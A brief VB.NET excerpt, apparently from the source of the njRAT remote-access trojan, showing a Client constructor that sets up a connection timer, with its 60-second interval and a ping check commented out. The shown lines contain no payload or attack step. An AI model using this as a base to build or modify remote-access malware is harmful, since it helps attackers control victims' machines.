...
Namespace NJRAT
    Public Class Client
        ...
        Public Sub New(ByVal c As TcpClient, ByVal sk As SK)
            Me.t = New Timer(New TimerCallback(AddressOf Me.lam__6), Nothing, 0, &H0)
            'Me.t = New Timer(New TimerCallback(AddressOf Me.lam__6), Nothing, 0, &HEA60)   '60s
        ...
        Private Sub lam__6(ByVal object_0 As Object)
            Me.method_0()
            'If Form1.PingEnable Then
            'Form1.PingEnable = False
            'End If
        End Sub
